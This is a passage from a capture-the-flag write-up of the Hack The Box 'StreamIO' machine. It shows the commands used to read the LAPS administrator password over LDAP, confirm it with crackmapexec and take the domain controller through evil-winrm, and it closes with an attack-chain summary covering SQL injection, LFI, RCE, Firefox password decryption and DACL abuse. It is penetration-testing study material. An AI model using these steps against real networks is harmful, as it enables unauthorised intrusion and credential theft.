CORE STAFF has read LPASpassword access on DC.STREAMIO.HTB
![Image](../../assets/images/Pasted-image-20260503040629.png)

**Reading LAPS Password**
**What is LAPS?**  
Local Administrator Password Solution (LAPS) automatically sets a unique random password for the local Administrator account on each machine and stores it in AD as the `ms-MCS-AdmPwd` attribute. `ReadLAPSPassword` is the permission controlling who can read this attribute.

Since CORE STAFF has `ReadLAPSPassword` on the DC, and JDgodd is now a member, we can read the Administrator password:


```bash
┌──(penguin㉿0X0F)-[~/CPTS/CPTS official Pathway/StreamIO/pyLAPS]
└─$ ldapsearch -x -H ldap://10.129.38.65 -D "JDgodd@streamio.htb" -w "JDg0dd1s@d0p3cr3@t0r" -b "DC=streamIO,DC=htb" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd

# DC, Domain Controllers, streamIO.htb
dn: CN=DC,OU=Domain Controllers,DC=streamIO,DC=htb
ms-Mcs-AdmPwd: mK21Y8g;sdbJJI

```

`Administrator : mK21Y8g;sdbJJI`

Verifying using cme weather we have access to  winrm 
```bash
┌──(penguin㉿0X0F)-[~/CPTS/CPTS official Pathway/StreamIO/pyLAPS]
└─$ crackmapexec winrm streamio.htb -u Administrator -p "mK21Y8g;sdbJJI"

[*] completed: 100.00% (1/1)
SMB         streamIO.htb    5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:streamIO.htb)
HTTP        streamIO.htb    5985   DC               [*] http://streamIO.htb:5985/wsman
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       streamIO.htb    5985   DC               [+] streamIO.htb\Administrator:mK21Y8g;sdbJJI (Pwn3d!)                                                                                                
```

Administrator has been pawned and captured his flag 
```bash
┌──(penguin㉿0X0F)-[~/CPTS/CPTS official Pathway/StreamIO/pyLAPS]
└─$ evil-winrm -i streamio.htb -u Administrator -p "mK21Y8g;sdbJJI"

```

```bash
*Evil-WinRM* PS C:\Users> type C:\Users\Martin\Desktop\root.txt
0dbec7b90843ebab0d3efe76bbd4c5b8
```

## Key Takeaways

- **WAF bypass via manual SQLi** — when sqlmap gets blocked, the confirmed payload can be used character-by-character manually
- **PHP `eval()` without tags** — `eval(file_get_contents())` expects raw PHP code, not `<?php ?>` wrapped
- **LFI to source code disclosure** — `php://filter/convert.base64-encode/resource=` is invaluable for reading server-side code
- **Firefox saved passwords** — always check `%APPDATA%\Mozilla\Firefox\Profiles\` for saved credentials, decrypt with firepwd
- **BloodHound attack paths** — `Owns` → `WriteMembers` → `ReadLAPSPassword` is a clean chain to DA
- **LAPS** — `ms-MCS-AdmPwd` stores the local admin password; `ReadLAPSPassword` on a DC = game over

```
SQLi (watch.streamio.htb)
        ↓
Dump Users + Crack MD5 Hashes
        ↓
Admin Panel Login (yoshihide)
        ↓
LFI via ?debug= → Read master.php
        ↓
RCE via eval(file_get_contents())
        ↓
Reverse Shell as streamio\yoshihide
        ↓
sqlcmd → streamio_backup DB → nikk37 hash
        ↓
Evil-WinRM as nikk37
        ↓
Firefox Profile → firepwd → JDgodd creds
        ↓
BloodHound → JDgodd owns CORE STAFF
        ↓
DACL Abuse → Add JDgodd to CORE STAFF
        ↓
ReadLAPSPassword → Administrator password
        ↓
Evil-WinRM as Administrator 🏴
```
